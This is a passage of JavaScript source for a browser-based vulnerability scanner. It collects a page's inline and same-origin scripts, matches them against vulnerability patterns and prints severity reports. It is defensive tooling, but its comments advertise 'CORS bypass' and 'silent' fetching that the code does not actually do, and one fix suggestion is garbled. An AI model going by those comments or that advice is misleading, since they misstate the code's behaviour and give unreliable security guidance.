                if (content.length > this.maxScriptSize) return;
                collected.push({
                    source: 'INLINE_SCRIPT',
                    content: content,
                    type: 'inline',
                    size: content.length
                });
            } else if (script.src) {
                try {
                    const srcObj = new URL(script.src);
                    if (!['http:', 'https:'].includes(srcObj.protocol)) return;
                } catch (e) {
                    return;
                }
                collected.push({
                    source: script.src,
                    content: `// External script: ${script.src} (pending fetch)`,
                    type: 'external-pending',
                    size: 0
                });
            }
        });

        this.scripts = collected;

        // Advanced external script fetching with multiple CORS bypass techniques
        await this.fetchExternalScripts();

        return collected;
    }

    // 🔄 SILENT EXTERNAL SCRIPT FETCHING - NO CORS ERRORS
    async fetchExternalScripts() {
        const externalScripts = this.scripts.filter(s => s.type === 'external-pending');

        if (externalScripts.length === 0) return;

        const scriptIndexMap = new Map();
        this.scripts.forEach((s, i) => scriptIndexMap.set(s.source, i));

        const sameOriginScripts = externalScripts.filter(script => {
            try {
                const urlObj = new URL(script.source);
                return urlObj.origin === window.location.origin;
            } catch (e) {
                return false;
            }
        });

        const sameOriginSet = new Set(sameOriginScripts.map(s => s.source));

        externalScripts.forEach(script => {
            if (sameOriginSet.has(script.source)) return;
            const scriptIndex = scriptIndexMap.get(script.source);
            if (scriptIndex === undefined) return;
            this.scripts[scriptIndex] = {
                source: script.source,
                content: `// External script: ${script.source.split('/').pop()} (CORS blocked - cross-origin)`,
                type: 'external-blocked',
                size: 0,
                fetchMethod: 'blocked'
            };
        });

        // Only attempt fetch for same-origin scripts
        if (sameOriginScripts.length === 0) return;

        const fetchPromises = sameOriginScripts.map(async (script) => {
            const scriptIndex = scriptIndexMap.get(script.source);
            if (scriptIndex === undefined) return;

            try {
                const response = await this.silentFetch(script.source);
                if (response && response.content) {
                    // Determine the appropriate type based on fetch method
                    let scriptType = 'external';
                    if (response.method === 'cors-blocked') {
                        scriptType = 'external-blocked';
                    } else if (response.method === 'no-cors') {
                        scriptType = 'external-no-cors';
                    } else if (response.method === 'injection') {
                        scriptType = 'external-injected';
                    } else if (response.method === 'jsonp') {
                        scriptType = 'external-jsonp';
                    } else if (response.method === 'same-origin') {
                        scriptType = 'external-same-origin';
                    } else if (response.method === 'cors-alt') {
                        scriptType = 'external-cors-alt';
                    }

                    this.scripts[scriptIndex] = {
                        source: script.source,
                        content: response.content,
                        type: scriptType,
                        size: response.content.length,
                        fetchMethod: response.method
                    };
                } else {
                    // No response or empty content
                    this.scripts[scriptIndex] = {
                        source: script.source,
                        content: `// External script: ${script.source.split('/').pop()} (CORS blocked - no content available)`,
                        type: 'external-blocked',
                        size: 0,
                        fetchMethod: 'blocked'
                    };
                }
            } catch (error) {
                // Any exception during fetch
                this.scripts[scriptIndex] = {
                    source: script.source,
                    content: `// External script: ${script.source.split('/').pop()} (fetch failed)`,
                    type: 'external-blocked',
                    size: 0,
                    fetchMethod: 'failed'
                };
            }
        });

        // Wait for all fetches with Promise.allSettled for maximum reliability
        await Promise.allSettled(fetchPromises);
    }

    // 🔇 SILENT FETCH - MULTIPLE TECHNIQUES TO GET EXTERNAL SCRIPTS
    async silentFetch(url) {
        if (!url || typeof url !== 'string') return null;
        try {
            const urlObj = new URL(url);
            if (!['http:', 'https:'].includes(urlObj.protocol)) return null;
            if (/(?:127\.\d+\.\d+\.\d+|0\.0\.0\.0|169\.254\.\d+\.\d+|10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+|localhost)/i.test(urlObj.hostname) && urlObj.hostname !== window.location.hostname) {
                return null;
            }
        } catch (e) {
            return null;
        }
        // Console and error suppression is already handled globally
        // This method focuses purely on fetching techniques

        return new Promise((resolve) => {
            (async () => {
                const timeout = setTimeout(() => {
                    resolve(null);
                }, this.maxFetchTimeout);

                try {
                    // Method 1: Try same-origin check first (most reliable)
                    try {
                        const urlObj = new URL(url);
                        const currentOrigin = window.location.origin;

                        if (urlObj.origin === currentOrigin) {
                            const controller = new AbortController();
                            const timeoutId = setTimeout(() => controller.abort(), this.maxFetchTimeout);

                            const response = await fetch(url, {
                                mode: 'cors',
                                credentials: 'same-origin',
                                signal: controller.signal
                            });

                            clearTimeout(timeoutId);

                            if (response && response.ok) {
                                const content = await response.text();
                                if (content && content.length > 10) {
                                    clearTimeout(timeout);
                                    resolve({ content, method: 'same-origin' });
                                    return;
                                }
                            }
                        } else {
                            // Cross-origin - don't attempt fetch to avoid CORS errors
                            clearTimeout(timeout);
                            resolve({
                                content: `// External script: ${url.split('/').pop()} (CORS blocked - cross-origin)`,
                                method: 'cors-blocked'
                            });
                            return;
                        }
                    } catch (sameOriginError) {
                        // Silent - continue
                    }

                    // Method 2: Try normal fetch with minimal headers (only if same origin)
                    try {
                        const controller = new AbortController();
                        const timeoutId = setTimeout(() => controller.abort(), this.maxFetchTimeout);

                        const response = await fetch(url, {
                            mode: 'cors',
                            credentials: 'omit',
                            cache: 'no-cache',
                            signal: controller.signal,
                            headers: {
                                'Accept': 'text/javascript, application/javascript, */*',
                                'User-Agent': navigator.userAgent
                            }
                        });

                        clearTimeout(timeoutId);

                        if (response && response.ok) {
                            const content = await response.text();
                            if (content && content.length > 10) {
                                clearTimeout(timeout);
                                resolve({ content, method: 'cors' });
                                return;
                            }
                        }
                    } catch (corsError) {
                        // Silent - continue to next method
                    }

                    // Method 3: Script injection (opt-in only - security gate)
                    if (this.enableScriptInjection) {
                        try {
                            const scriptContent = await this.injectAndCaptureScript(url);
                            if (scriptContent && scriptContent.length > 10) {
                                clearTimeout(timeout);
                                resolve({ content: scriptContent, method: 'injection' });
                                return;
                            }
                        } catch (injectError) {
                            // Silent - continue
                        }
                    }

                    // All methods failed - return placeholder content
                    clearTimeout(timeout);
                    resolve({
                        content: `// External script: ${url.split('/').pop()} (CORS blocked - content not accessible)`,
                        method: 'cors-blocked'
                    });

                } catch (error) {
                    clearTimeout(timeout);
                    resolve(null);
                }
            })();
        });
    }

    // 💉 SCRIPT INJECTION TECHNIQUE (gated by enableScriptInjection)
    injectAndCaptureScript(url) {
        return new Promise((resolve) => {
            try {
                let urlObj;
                try { urlObj = new URL(url); } catch (e) { resolve(null); return; }
                if (!['http:', 'https:'].includes(urlObj.protocol)) { resolve(null); return; }
                if (/(?:127\.\d+\.\d+\.\d+|0\.0\.0\.0|169\.254\.\d+\.\d+|10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+|localhost)/i.test(urlObj.hostname) && urlObj.hostname !== window.location.hostname) {
                    resolve(null); return;
                }
                const script = document.createElement('script');
                script.src = url;
                script.crossOrigin = 'anonymous';
                script.async = true;

                // Override script's error handling to be silent
                const originalOnError = script.onerror;
                script.onerror = () => {
                    // Silent cleanup
                    if (script.parentNode) {
                        script.parentNode.removeChild(script);
                    }
                    resolve(null);
                };

                script.onload = () => {
                    try {
                        // Try to get content if available (rarely works due to CORS)
                        let content = null;
                        if (script.textContent && script.textContent.trim()) {
                            content = script.textContent;
                        }

                        // Clean up
                        if (script.parentNode) {
                            script.parentNode.removeChild(script);
                        }

                        resolve(content || `// External script: ${url.split('/').pop()} (injected successfully)`);
                    } catch (error) {
                        if (script.parentNode) {
                            script.parentNode.removeChild(script);
                        }
                        resolve(null);
                    }
                };

                // Add to head temporarily
                document.head.appendChild(script);

                // Timeout after 3 seconds (reduced for faster failure)
                setTimeout(() => {
                    if (script.parentNode) {
                        script.parentNode.removeChild(script);
                    }
                    resolve(null);
                }, this.maxFetchTimeout + 1000);

            } catch (error) {
                // If script creation fails, resolve with null
                resolve(null);
            }
        });
    }

    // 🌐 JSONP-STYLE LOADING
    loadViaJSONP(url) {
        return new Promise((resolve) => {
            try {
                let urlObj;
                try { urlObj = new URL(url); } catch (e) { resolve(null); return; }
                if (!['http:', 'https:'].includes(urlObj.protocol)) { resolve(null); return; }
                if (/(?:127\.\d+\.\d+\.\d+|0\.0\.0\.0|169\.254\.\d+\.\d+|10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+|localhost)/i.test(urlObj.hostname) && urlObj.hostname !== window.location.hostname) {
                    resolve(null); return;
                }

                const arr = new Uint8Array(9);
                crypto.getRandomValues(arr);
                const callbackName = 'jsonp_cb_' + Array.from(arr, b => b.toString(36)).join('');

                // Define the callback function
                window[callbackName] = (data) => {
                    try {
                        // Clean up immediately
                        delete window[callbackName];
                        const script = document.querySelector(`script[data-jsonp="${callbackName}"]`);
                        if (script && script.parentNode) {
                            script.parentNode.removeChild(script);
                        }

                        if (typeof data === 'string' && data.length > 10) {
                            resolve(data);
                        } else if (data && typeof data === 'object') {
                            resolve(JSON.stringify(data, null, 2));
                        } else {
                            resolve(`// External script: ${url.split('/').pop()} (JSONP loaded)`);
                        }
                    } catch (error) {
                        delete window[callbackName];
                        const script = document.querySelector(`script[data-jsonp="${callbackName}"]`);
                        if (script && script.parentNode) {
                            script.parentNode.removeChild(script);
                        }
                        resolve(null);
                    }
                };

                // Create script element
                const script = document.createElement('script');
                script.src = url;
                script.setAttribute('data-jsonp', callbackName);
                script.async = true;

                script.onload = () => {
                    // If callback wasn't called within 500ms, assume it's not JSONP
                    setTimeout(() => {
                        if (window[callbackName]) {
                            delete window[callbackName];
                            const script = document.querySelector(`script[data-jsonp="${callbackName}"]`);
                            if (script && script.parentNode) {
                                script.parentNode.removeChild(script);
                            }
                            resolve(`// External script: ${url.split('/').pop()} (loaded via JSONP)`);
                        }
                    }, 500);
                };

                script.onerror = () => {
                    // Silent cleanup
                    if (window[callbackName]) {
                        delete window[callbackName];
                    }
                    const script = document.querySelector(`script[data-jsonp="${callbackName}"]`);
                    if (script && script.parentNode) {
                        script.parentNode.removeChild(script);
                    }
                    resolve(null);
                };

                document.head.appendChild(script);

                // Timeout after 2 seconds (reduced for faster failure)
                setTimeout(() => {
                    if (window[callbackName]) {
                        delete window[callbackName];
                        const script = document.querySelector(`script[data-jsonp="${callbackName}"]`);
                        if (script && script.parentNode) {
                            script.parentNode.removeChild(script);
                        }
                    }
                    resolve(null);
                }, this.maxFetchTimeout);

            } catch (error) {
                // If setup fails, resolve with null
                resolve(null);
            }
        });
    }

    // 📋 DISPLAY ALL COLLECTED JS FILES FOR USER CHOICE
    displayCollectedScripts() {
        if (this.scripts.length === 0) {
            console.log('❌ No JavaScript files found on this page');
            return;
        }

        console.log('\n📂 JAVASCRIPT FILES FOUND:');
        console.log('═'.repeat(60));

        const inlineScripts = this.scripts.filter(s => s.type === 'inline');
        const externalFetched = this.scripts.filter(s => s.type === 'external');
        const externalSameOrigin = this.scripts.filter(s => s.type === 'external-same-origin');
        const externalCorsAlt = this.scripts.filter(s => s.type === 'external-cors-alt');
        const externalNoCors = this.scripts.filter(s => s.type === 'external-no-cors');
        const externalInjected = this.scripts.filter(s => s.type === 'external-injected');
        const externalJsonp = this.scripts.filter(s => s.type === 'external-jsonp');
        const externalBlocked = this.scripts.filter(s => s.type === 'external-blocked');
        const externalEmpty = this.scripts.filter(s => s.type === 'external-empty');

        let scriptCounter = 1;

        if (inlineScripts.length > 0) {
            console.log(`\n📝 INLINE SCRIPTS (${inlineScripts.length}) - FULLY ANALYZED:`);
            inlineScripts.forEach((script) => {
                console.log(`   ${scriptCounter}. ${script.source} (${script.size} chars) ✅`);
                scriptCounter++;
            });
        }

        if (externalFetched.length > 0) {
            console.log(`\n🌐 EXTERNAL SCRIPTS (${externalFetched.length}) - FETCHED VIA CORS:`);
            externalFetched.forEach((script) => {
                const fileName = script.source.split('/').pop();
                console.log(`   ${scriptCounter}. ${fileName} (${script.size} chars) ✅`);
                scriptCounter++;
            });
        }

        if (externalSameOrigin.length > 0) {
            console.log(`\n🏠 EXTERNAL SCRIPTS (${externalSameOrigin.length}) - SAME ORIGIN:`);
            externalSameOrigin.forEach((script) => {
                const fileName = script.source.split('/').pop();
                console.log(`   ${scriptCounter}. ${fileName} (${script.size} chars) 🏠`);
                scriptCounter++;
            });
        }

        if (externalCorsAlt.length > 0) {
            console.log(`\n🔄 EXTERNAL SCRIPTS (${externalCorsAlt.length}) - CORS ALTERNATIVE:`);
            externalCorsAlt.forEach((script) => {
                const fileName = script.source.split('/').pop();
                console.log(`   ${scriptCounter}. ${fileName} (${script.size} chars) 🔄`);
                scriptCounter++;
            });
        }

        if (externalNoCors.length > 0) {
            console.log(`\n🔒 EXTERNAL SCRIPTS (${externalNoCors.length}) - FETCHED VIA NO-CORS:`);
            externalNoCors.forEach((script) => {
                const fileName = script.source.split('/').pop();
                console.log(`   ${scriptCounter}. ${fileName} (${script.size} chars) 🔒`);
                console.log(`      📍 ${script.source} (content not readable due to CORS)`);
                scriptCounter++;
            });
        }

        if (externalInjected.length > 0) {
            console.log(`\n💉 EXTERNAL SCRIPTS (${externalInjected.length}) - FETCHED VIA INJECTION:`);
            externalInjected.forEach((script) => {
                const fileName = script.source.split('/').pop();
                console.log(`   ${scriptCounter}. ${fileName} (${script.size} chars) 💉`);
                console.log(`      📍 ${script.source}`);
                scriptCounter++;
            });
        }

        if (externalJsonp.length > 0) {
            console.log(`\n🌐 EXTERNAL SCRIPTS (${externalJsonp.length}) - FETCHED VIA JSONP:`);
            externalJsonp.forEach((script) => {
                const fileName = script.source.split('/').pop();
                console.log(`   ${scriptCounter}. ${fileName} (${script.size} chars) 🌐`);
                console.log(`      📍 ${script.source}`);
                scriptCounter++;
            });
        }

        if (externalBlocked.length > 0) {
            console.log(`\n🚫 EXTERNAL SCRIPTS (${externalBlocked.length}) - BLOCKED BY CORS:`);
            externalBlocked.forEach((script) => {
                const fileName = script.source.split('/').pop();
                console.log(`   ${scriptCounter}. ${fileName} (BLOCKED) ❌`);
                console.log(`      📍 ${script.source}`);
                scriptCounter++;
            });
        }

        if (externalEmpty.length > 0) {
            console.log(`\n📄 EXTERNAL SCRIPTS (${externalEmpty.length}) - EMPTY CONTENT:`);
            externalEmpty.forEach((script) => {
                const fileName = script.source.split('/').pop();
                console.log(`   ${scriptCounter}. ${fileName} (EMPTY) 📄`);
                console.log(`      📍 ${script.source}`);
                scriptCounter++;
            });
        }

        const analyzableScripts = inlineScripts.length + externalFetched.length + externalSameOrigin.length + externalCorsAlt.length + externalNoCors.length + externalInjected.length + externalJsonp.length;

        console.log('\n📊 SUMMARY:');
        console.log(`   Total Scripts: ${this.scripts.length}`);
        console.log(`   ✅ Analyzable: ${analyzableScripts} (Inline + Fetched + Injected)`);
        console.log(`   ❌ Blocked: ${externalBlocked.length}`);
        console.log(`   📄 Empty: ${externalEmpty.length}`);
        console.log(`   🎯 Will scan: ${analyzableScripts} scripts for vulnerabilities`);

        return {
            total: this.scripts.length,
            analyzable: analyzableScripts,
            inline: inlineScripts.length,
            externalFetched: externalFetched.length,
            externalInjected: externalInjected.length,
            externalBlocked: externalBlocked.length,
            externalEmpty: externalEmpty.length,
            note: `${analyzableScripts} scripts will be analyzed for vulnerabilities`
        };
    }

    //  SCAN FOR ALL VULNERABILITIES - ULTRA FAST (optimized dedup)
    scanAllVulnerabilities() {
        this.results = {};
        this._dedupIndex.clear();
        Object.keys(this.vulnerabilityTypes).forEach(vulnType => {
            this.results[vulnType] = [];
        });

        let processedLines = 0;

        const compiledPatterns = {};
        Object.entries(this.vulnerabilityTypes).forEach(([vulnType, config]) => {
            compiledPatterns[vulnType] = config.patterns.map(pattern => {
                let cached = this._compiledPatternCache.get(pattern);
                if (!cached) {
                    cached = new RegExp(pattern, 'gi');
                    this._compiledPatternCache.set(pattern, cached);
                }
                return { pattern, regex: cached };
            });
        });

        this.scripts.forEach((script, scriptIndex) => {
            if (script.type === 'external-blocked' || script.type === 'external-empty' || script.type === 'external-no-cors') return;

            const content = script.content;
            if (!content || content.startsWith('// External script:')) return;
            if (content.length > this.maxScriptSize) return;

            const lines = content.split('\n');

            let sourceName;
            if (script.type === 'inline') {
                sourceName = `Inline_${scriptIndex}`;
            } else if (script.type === 'external' || script.type === 'external-injected') {
                sourceName = script.source.split('/').pop() || `External_${scriptIndex}`;
            } else {
                sourceName = `Script_${scriptIndex}`;
            }

            lines.forEach((line, lineNum) => {
                processedLines++;
                Object.entries(compiledPatterns).forEach(([vulnType, patterns]) => {
                    patterns.forEach(({pattern, regex}) => {
                        regex.lastIndex = 0;
                        if (regex.test(line) && this.validateMatch(line, pattern)) {
                            const dedupKey = `${sourceName}:${lineNum + 1}`;
                            const existingIdx = this._dedupIndex.get(dedupKey);

                            if (existingIdx === undefined) {
                                // Build context: 2 lines before + vulnerable line + 2 lines after
                                const ctxStart = Math.max(0, lineNum - 2);
                                const ctxEnd = Math.min(lines.length, lineNum + 3);
                                const contextLines = [];
                                for (let ci = ctxStart; ci < ctxEnd; ci++) {
                                    contextLines.push({
                                        line: ci + 1,
                                        code: lines[ci],
                                        highlight: ci === lineNum
                                    });
                                }

                                const idx = this.results[vulnType].length;
                                this._dedupIndex.set(dedupKey, idx);
                                this.results[vulnType].push({
                                    vulnerability: vulnType,
                                    severity: this.vulnerabilityTypes[vulnType].severity,
                                    source: sourceName,
                                    fullSource: script.source || `(inline #${scriptIndex})`,
                                    line: lineNum + 1,
                                    code: line.trim().substring(0, 200),
                                    context: contextLines,
                                    description: this.vulnerabilityTypes[vulnType].description,
                                    pattern_matched: [pattern]
                                });
                            } else {
                                const existing = this.results[vulnType][existingIdx];
                                if (existing && !existing.pattern_matched.includes(pattern)) {
                                    existing.pattern_matched.push(pattern);
                                }
                            }
                        }
                    });
                });
            });
        });

        return this.results;
    }

    // 📊 GENERATE PROFESSIONAL REPORT
    generateDetailedReport() {
        let totalVulns = 0;
        let criticalCount = 0;
        let highCount = 0;

        Object.entries(this.results).forEach(([vulnType, vulnerabilities]) => {
            if (vulnerabilities.length > 0) {
                vulnerabilities.forEach(v => {
                    totalVulns++;
                    if (v.severity === 'CRITICAL') criticalCount++;
                    if (v.severity === 'HIGH') highCount++;
                });
            }
        });

        console.log('');
        console.log('  ╔═══════════════════════════════════════════════════════════════╗');
        console.log('  ║                    SCAN RESULTS                              ║');
        console.log('  ╚═══════════════════════════════════════════════════════════════╝');
        console.log(`  Scripts Analyzed: ${this.scripts.length}`);
        console.log(`  Total Findings:   ${totalVulns}`);
        console.log(`  Critical: ${criticalCount}  |  High: ${highCount}  |  Medium/Low: ${totalVulns - criticalCount - highCount}`);
        console.log('');

        if (!this.quiet && totalVulns > 0) {
            const severityOrder = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3, INFO: 4 };
            const allFindings = [];
            Object.entries(this.results).forEach(([vulnType, vulns]) => {
                vulns.forEach(v => allFindings.push({ ...v, vulnType }));
            });
            allFindings.sort((a, b) => (severityOrder[a.severity] || 5) - (severityOrder[b.severity] || 5));

            console.log('  ┌─── FINDINGS ─────────────────────────────────────────────────┐');
            allFindings.forEach((v, i) => {
                const sev = v.severity === 'CRITICAL' ? '[!!!CRITICAL!!!]' :
                    v.severity === 'HIGH' ? '[!!HIGH!!]' :
                    v.severity === 'MEDIUM' ? '[MEDIUM]' : '[LOW]';
                console.log('');
                console.log(`  ${sev} #${i + 1} ${v.vulnType}`);
                console.log(`  File: ${v.fullSource || v.source}`);
                console.log(`  Line: ${v.line}`);
                console.log(`  Code: ${v.code}`);
                console.log(`  Why:  ${v.description}`);

                // Show code context
                if (v.context && v.context.length > 0) {
                    console.log('  Context:');
                    v.context.forEach(ctx => {
                        const marker = ctx.highlight ? '  >>' : '    ';
                        console.log(`    ${marker} ${ctx.line}: ${ctx.code}`);
                    });
                }

                if (v.pattern_matched && v.pattern_matched.length > 0) {
                    console.log(`  Pattern: ${v.pattern_matched[0]}`);
                }
            });
            console.log('');
            console.log('  └──────────────────────────────────────────────────────────────┘');
        }

        return {
            results: this.results,
            summary: {
                total: totalVulns,
                critical: criticalCount,
                high: highCount,
                mediumLow: totalVulns - criticalCount - highCount,
                scripts: this.scripts.length
            }
        };
    }

    // 🎯 QUICK HUNT FUNCTION
    async hunt() {
        this.log('🎯 STARTING COMPLETE VULNERABILITY HUNT...');
        await this.collectAllScripts();
        this.scanAllVulnerabilities();
        return this.generateEnhancedReport();
    }

    // 🛡️ SECURITY HARDENING - Validate all inputs
    validateInput(input, expectedType) {
        if (!input) return false;
        const type = typeof input;
        return type === expectedType;
    }

    // 🔍 ENHANCEMENT 1: Deep scan with code flow analysis
    async deepScanAnalysis() {
        const flowResults = {};
        for (const script of this.scripts) {
            if (script.type === 'inline' || script.type.includes('same-origin')) {
                flowResults[script.source] = this.analyzeCodeFlow(script.content);
            }
        }
        return flowResults;
    }

    analyzeCodeFlow(content) {
        const flow = { sources: [], sinks: [], sanitizers: [], paths: [] };
        const lines = content.split('\n');
        lines.forEach((line, idx) => {
            if (line.includes('location.') || line.includes('req.')) {
                flow.sources.push({ line: idx + 1, code: line.trim() });
            }
            if (line.includes('eval(') || line.includes('innerHTML')) {
                flow.sinks.push({ line: idx + 1, code: line.trim() });
            }
            if (line.includes('encode') || line.includes('sanitize')) {
                flow.sanitizers.push({ line: idx + 1, code: line.trim() });
            }
        });
        return flow;
    }

    // 📊 ENHANCEMENT 2: Export results to JSON
    exportResults(format = 'json') {
        const data = {
            timestamp: new Date().toISOString(),
            summary: this.generateDetailedReport().summary,
            vulnerabilities: this.results
        };
        return format === 'json' ? JSON.stringify(data, null, 2) : data;
    }

    // 🎯 ENHANCEMENT 3: Filter vulnerabilities by severity
    filterBySeverity(severity) {
        const filtered = {};
        Object.entries(this.results).forEach(([type, vulns]) => {
            filtered[type] = vulns.filter(v => v.severity === severity);
        });
        return filtered;
    }

    // 🔧 ENHANCEMENT 4: Auto-fix suggestions
    getFixSuggestions(vulnType) {
        const fixes = {
            'DOM-Based XSS': 'Use textContent instead of innerHTML, or sanitize with DOMPurify',
            'SQL Injection': 'Use parameterized queries or ORM methods',
            'Command Injection': 'Avoid eval/Function, use whitelist validation',
            'Path Traversal': 'Use path.resolve() and validate paths',
            'Prototype Pollution': 'Use Object.freeze() or Object.defineProperty() with false: true'
        };
        return fixes[vulnType] || 'Review security best practices for this vulnerability type';
    }

    // 📈 ENHANCEMENT 5: Vulnerability trend analysis
    getVulnerabilityTrends() {
        const trends = { bySeverity: {}, byType: {}, byFile: {} };
        Object.entries(this.results).forEach(([type, vulns]) => {
            trends.byType[type] = vulns.length;
            vulns.forEach(v => {
                trends.bySeverity[v.severity] = (trends.bySeverity[v.severity] || 0) + 1;
                trends.byFile[v.source] = (trends.byFile[v.source] || 0) + 1;
            });
        });
        return trends;
    }

    // 🔄 ENHANCEMENT 6: Compare with previous scan
    compareWithPrevious(previousResults) {
        const comparison = { new: [], fixed: [], changed: [] };
        Object.entries(this.results).forEach(([type, vulns]) => {
            const prev = previousResults[type] || [];
            vulns.forEach(v => {
                if (!prev.some(p => p.source === v.source && p.line === v.line)) {
                    comparison.new.push({ ...v, type });
                }
            });
        });
        return comparison;
    }

    // 🎨 ENHANCEMENT 7: Generate HTML report
    generateHTMLReport() {
        const summary = this.generateDetailedReport().summary;
        return `
            <html><head><title>Security Report</title></head>
            <body>
                <h1>JavaScript Security Scan Report</h1>
                <p>Total: ${summary.total}, Critical: ${summary.critical}, High: ${summary.high}</p>
            </body></html>
        `;
    }

    // 📋 ENHANCEMENT 8: Quick summary for dashboard
    getQuickSummary() {
        const summary = this.generateDetailedReport().summary;
        return {
            riskScore: Math.round((summary.critical * 10 + summary.high * 5) / summary.scripts),
            status: summary.critical > 0 ? 'CRITICAL' : summary.high > 0 ? 'WARNING' : 'SAFE'
        };
    }

    // 🔐 ENHANCEMENT 9: Security headers check
    checkSecurityHeaders() {
        const headers = {};
        ['Content-Security-Policy', 'X-Frame-Options', 'X-Content-Type-Options'].forEach(h => {
            headers[h] = document.head.querySelector(`meta[http-equiv="${h}"]`) ? 'present' : 'missing';
        });
        return headers;
    }

    // 🛠️ ENHANCEMENT 10: Configuration options (prototype-pollution safe)
    updateConfig(options) {
        if (!options || typeof options !== 'object') return this;
        Object.keys(options).forEach(key => {
            if (this._configWhitelist.has(key)) {
                this[key] = options[key];
            }
        });
        return this;
    }

    // 📱 ENHANCEMENT 11: Mobile detection
    isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    // 🌐 ENHANCEMENT 12: Language detection
    detectLanguage(code) {
        if (code.includes('React') || code.includes('useState')) return 'React';
        if (code.includes('Vue') || code.includes('v-')) return 'Vue';
        if (code.includes('Angular') || code.includes('@Component')) return 'Angular';
        return 'Vanilla';
    }

    // ⚡ ENHANCEMENT 13: Performance metrics
    getPerformanceMetrics() {
        return {
            scanTime: performance.now() - this._startTime,
            patternsMatched: Object.values(this.results).reduce((a, b) => a + b.length, 0)
        };
    }

    // 🎯 ENHANCEMENT 14: Targeted scan for specific vulnerability
    scanVulnerabilityType(vulnType) {
        const config = this.vulnerabilityTypes[vulnType];
        if (!config) return { error: 'Unknown vulnerability type' };
        return this.scanForType(vulnType, config.patterns);
    }

    scanForType(vulnType, patterns) {
        const results = [];
        const regexes = patterns.map(p => {
            let cached = this._compiledPatternCache.get(p);
            if (!cached) {
                cached = new RegExp(p, 'gi');
                this._compiledPatternCache.set(p, cached);
            }
            return { pattern: p, regex: cached };
        });
        this.scripts.forEach(script => {
            if (script.type.includes('inline') || script.type.includes('same-origin')) {
                const lines = script.content.split('\n');
                lines.forEach((line, idx) => {
                    regexes.forEach(({ pattern, regex }) => {
                        regex.lastIndex = 0;
                        if (regex.test(line) && this.validateMatch(line, pattern)) {
                            results.push({ source: script.source, line: idx + 1, code: line.trim() });
                        }
                    });
                });
            }
        });
        return results;
    }

    // 📊 ENHANCEMENT 15: Statistical analysis
    getStatisticalAnalysis() {
        const stats = { totalLines: 0, totalScripts: this.scripts.length, avgVulnsPerScript: 0 };
        this.scripts.forEach(s => { stats.totalLines += s.content.split('\n').length; });
        stats.avgVulnsPerScript = Object.values(this.results).reduce((a, b) => a + b.length, 0) / stats.totalScripts;
        return stats;
    }

    // 🔍 ENHANCEMENT 16: Context-aware scanning
    getContextAwareScan() {
        const criticalCount = Object.values(this.results).reduce((a, vulns) => a + vulns.filter(v => v.severity === 'CRITICAL').length, 0);
        return {
            clientSide: criticalCount > 0,
            serverSide: this.results['Node.js Security Issues']?.length > 0,
            frameworkSpecific: this.results['React Security Issues']?.length > 0 || this.results['Vue.js Security Issues']?.length > 0
        };
    }

    // 🛡️ ENHANCEMENT 17: Sanitizer detection
    detectSanitizers(code) {
        const sanitizers = ['DOMPurify', 'validator', 'sanitize-html', 'xss-filters'];
        return sanitizers.filter(s => code.includes(s));
    }

    // 📝 ENHANCEMENT 18: Code complexity analysis
    analyzeComplexity(content) {
        const lines = content.split('\n');
        let maxNesting = 0;
        lines.forEach(l => {
            const depth = (l.match(/\{/g) || []).length;
            if (depth > maxNesting) maxNesting = depth;
        });
        return {
            cyclomaticComplexity: lines.filter(l => l.includes('if ') || l.includes('for ')).length,
            nestingDepth: maxNesting
        };
    }

    // 🎯 ENHANCEMENT 19: Real-time monitoring
    startMonitoring() {
        this._monitorInterval = setInterval(() => {
            this.scanAllVulnerabilities();
        }, 30000);
        return this;
    }

    stopMonitoring() {
        if (this._monitorInterval) {
            clearInterval(this._monitorInterval);
            this._monitorInterval = null;
        }
        return this;
    }

    // 🎯 INTERACTIVE HUNT - COLLECT, DISPLAY, THEN SCAN BASED ON USER CHOICE
    async interactiveHunt() {
        this.log('🎯 STARTING INTERACTIVE VULNERABILITY HUNT...');

        // Step 1: Collect all JavaScript files
        console.log('📚 COLLECTING ALL JAVASCRIPT FILES...');
        await this.collectAllScripts();

        // Step 2: Display collected files to user
        console.log('\n📋 STEP 1: JAVASCRIPT FILES COLLECTED');
        const fileSummary = this.displayCollectedScripts();

        // Step 3: Show scan options menu
        console.log('\n🎯 STEP 2: CHOOSE SCAN OPTIONS');
        console.log('═'.repeat(50));
        console.log('Available Scan Options:');
        console.log('1️⃣  INSTANT SCAN  - Analyze inline scripts only (Fastest)');
        console.log('2️⃣  FAST SCAN     - Quick analysis with 15s timeout (Balanced)');
        console.log('3️⃣  FULL SCAN     - Complete analysis of all scripts (Thorough)');
        console.log('4️⃣  CUSTOM SCAN   - Choose specific vulnerability types');
        console.log('\n💡 USAGE EXAMPLES:');
        console.log('   window.JSHunter.JSFILE.runScan("1,2,3")  // Multiple options');
        console.log('   window.JSHunter.JSFILE.runScan(1)        // Single option');
        console.log('   window.JSHunter.JSFILE.instant()         // Quick access');

        // Step 4: Return control to user for choice
        console.log('\n⏳ WAITING FOR YOUR CHOICE...');
        console.log('💡 Call one of the scan methods above to continue');

        return {
            message: 'JavaScript files collected successfully. Choose your scan option.',
            filesCollected: fileSummary,
            nextStep: 'Call window.JSHunter.JSFILE.runScan(option) or window.JSHunter.JS.runScan(option)'
        };
    }

    // ⚡ INSTANT SCAN - Ultra fast inline analysis
    instantScan() {
        // Collect inline scripts immediately
        const scripts = Array.from(document.scripts);
        const inlineScripts = scripts
            .filter(script => script.textContent && script.textContent.trim())
            .map((script, index) => ({
                source: 'INLINE_SCRIPT',
                content: script.textContent,
                type: 'inline',
                size: script.textContent.length
            }));

        this.scripts = inlineScripts;

        // Scan immediately
        this.scanAllVulnerabilities();
        return this.generateEnhancedReport();
    }

    // 🏃‍♂️ FAST HUNT WITH TIMEOUT
    async fastHunt(timeoutMs = 10000) {
        this.log('🏃‍♂️ STARTING FAST VULNERABILITY HUNT...');

        // Create a timeout promise
        const timeoutPromise = new Promise((_, reject) => {
            setTimeout(() => reject(new Error('Hunt timeout')), timeoutMs);
        });

        try {
            // Race between hunt and timeout
            const result = await Promise.race([
                this.hunt(),
                timeoutPromise
            ]);
            return result;
        } catch (error) {
            if (error.message === 'Hunt timeout') {
